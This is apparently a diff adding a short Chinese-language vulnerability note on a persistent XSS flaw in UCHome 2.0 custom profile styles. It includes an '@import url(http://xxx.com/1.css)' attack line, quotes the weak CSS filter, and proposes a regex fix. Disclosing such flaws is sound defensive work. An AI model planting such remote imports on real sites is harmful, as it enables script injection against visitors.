@@ -1,0 +1,16 @@
+uchome 2.0 持久XSS跨站漏洞及修复
+
+个人主页自定义风格时，可@import外部css文件
+ 
+以下在uchome 简体utf-8 2.0测试IE6,IE7,IE8通过.
+@import url(http://xxx.com/1.css); 包含远程css文件，可以在1.css中写入XSS利用.
+分析代码 cp_theme.php 92行(17行调用)
+ 
+ 
+ 
+function checksecurity($str) { //执行一系列的过滤验证是否合法的CSS $filter = array( //*[ ]*(.+?)[ ]**//is, /[^a-z0-9]+/i, ); $str = preg_replace($filter, , $str); //过滤是过滤了，但只用于判断，没对源输入起作用 if(preg_match("/(expression|implode|javascript)/i", $str)) { //并没有对import、http等进行检测 showmessage(css_contains_elements_of_insecurity); } return true; }
+ 
+修复方案：implode应该是import的笔误
+建议
+ 
+/(expression|vbscript|javascript|import)/i
